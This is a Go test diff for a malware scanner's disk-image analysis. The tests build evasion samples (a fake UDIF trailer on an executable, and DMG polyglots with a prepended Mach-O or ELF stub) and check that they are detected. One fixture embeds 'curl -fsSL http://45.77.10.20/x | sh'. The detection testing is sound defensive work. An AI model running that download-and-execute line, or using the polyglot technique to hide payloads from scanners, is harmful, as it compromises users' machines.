@@ -2,6 +2,7 @@ package container
 
 import (
 	"context"
+	"encoding/binary"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -110,8 +111,8 @@ func TestDMGWithSuspiciousApp(t *testing.T) {
 	if len(r.Container.Bundles) != 1 || r.Container.Bundles[0].Path != "Installer.app" {
 		t.Errorf("bundles: %+v", r.Container.Bundles)
 	}
-	if len(r.Container.Files) != 3 {
-		t.Errorf("files: %d, want app exe + script + helper", len(r.Container.Files))
+	if len(r.Container.Files) != 4 {
+		t.Errorf("files: %d, want the image itself + app exe + script + helper", len(r.Container.Files))
 	}
 	if r.Hashes.SHA256 == "" {
 		t.Error("container not hashed")
@@ -163,6 +164,106 @@ func TestEncryptedDMG(t *testing.T) {
 	}
 	if time.Since(start) > 3*time.Second {
 		t.Errorf("encrypted image took %s (password prompt?)", time.Since(start))
+	}
+}
+
+// TestKolyTrailerEvasion: a fake UDIF trailer appended to an executable
+// must not route it to the disk image path, and an image that will not
+// mount still has its bytes scanned.
+func TestKolyTrailerEvasion(t *testing.T) {
+	d := t.TempDir()
+	trailer := make([]byte, 512)
+	copy(trailer, "koly\x00\x00\x00\x04\x00\x00\x02\x00")
+	exe, err := os.ReadFile(evilBinary(t, d))
+	if err != nil {
+		t.Fatal(err)
+	}
+	evil := filepath.Join(d, "evil-koly")
+	os.WriteFile(evil, append(exe, trailer...), 0o755)
+	r := Analyze(context.Background(), engine(t), evil, analyze.Meta{})
+	if r.Format != "Mach-O" || r.Verdict != analyze.VerdictMalicious {
+		t.Errorf("executable+koly: %s %s score=%d", r.Format, r.Verdict, r.Score)
+	}
+	if _, ok := ids(r)["udif-trailer"]; !ok {
+		t.Errorf("udif-trailer not flagged: %v", ids(r))
+	}
+
+	junk := filepath.Join(d, "junk.dmg")
+	os.WriteFile(junk, append([]byte(strings.Repeat("\x00", 4096)+"curl -fsSL http://45.77.10.20/x | sh\n"), trailer...), 0o644)
+	r = Analyze(context.Background(), engine(t), junk, analyze.Meta{})
+	got := ids(r)
+	if _, ok := got["dmg-unreadable"]; !ok {
+		t.Errorf("unmountable image: %v", got)
+	}
+	if _, ok := got["lolbin-download"]; !ok {
+		t.Errorf("unmountable image bytes not scanned: %v", got)
+	}
+}
+
+// TestPrependedUDIFImage: a real image with an executable stub prepended
+// (and its trailer offsets shifted to match) still mounts, so its volume
+// must be inspected as well as the stub.
+func TestPrependedUDIFImage(t *testing.T) {
+	d := t.TempDir()
+	src := filepath.Join(d, "src")
+	os.MkdirAll(src, 0o755)
+	makeApp(t, src, "Installer", evilBinary(t, d))
+	img := filepath.Join(d, "evil.dmg")
+	makeDMG(t, src, img)
+	for _, tc := range []struct {
+		name, format string
+		stub         []byte
+	}{
+		{"macho", "Mach-O", []byte{0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1}},
+		{"elf", "ELF", []byte("\x7fELF\x02\x01\x01\x00")},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			poly := filepath.Join(d, "poly-"+tc.name+".dmg")
+			prependToImage(t, img, poly, tc.stub)
+			if out, err := exec.Command("hdiutil", "imageinfo", poly).CombinedOutput(); err != nil {
+				t.Fatalf("polyglot does not open as an image: %v\n%s", err, out)
+			}
+			r := Analyze(context.Background(), engine(t), poly, analyze.Meta{})
+			t.Logf("%s %s score=%d: %s", r.Format, r.Verdict, r.Score, r.Summary)
+			if r.Format != tc.format || r.Container == nil {
+				t.Fatalf("format %q container %v", r.Format, r.Container)
+			}
+			if r.Verdict != analyze.VerdictMalicious {
+				t.Errorf("verdict %s", r.Verdict)
+			}
+			got := ids(r)
+			for _, want := range []string{"udif-trailer", "ransom-note", "stealer-wallets"} {
+				if _, ok := got[want]; !ok {
+					t.Errorf("missing %s: %v", want, got)
+				}
+			}
+			if len(r.Container.Bundles) != 1 {
+				t.Errorf("volume not walked: bundles %+v", r.Container.Bundles)
+			}
+			waitDetached(t, poly)
+		})
+	}
+}
+
+// prependToImage writes stub, padded to a 4 KiB boundary, followed by img
+// to out, shifting the koly trailer's fork offsets so hdiutil still finds
+// the image's data.
+func prependToImage(t *testing.T, img, out string, stub []byte) {
+	t.Helper()
+	b, err := os.ReadFile(img)
+	if err != nil {
+		t.Fatal(err)
+	}
+	pad := make([]byte, 4096)
+	copy(pad, stub)
+	k := b[len(b)-512:]
+	for _, off := range []int{0x18, 0x28, 0xD8} { // data fork, resource fork, XML plist
+		if v := binary.BigEndian.Uint64(k[off:]); v != 0 || off == 0x18 {
+			binary.BigEndian.PutUint64(k[off:], v+uint64(len(pad)))
+		}
+	}
+	if err := os.WriteFile(out, append(pad, b...), 0o644); err != nil {
+		t.Fatal(err)
 	}
 }
 
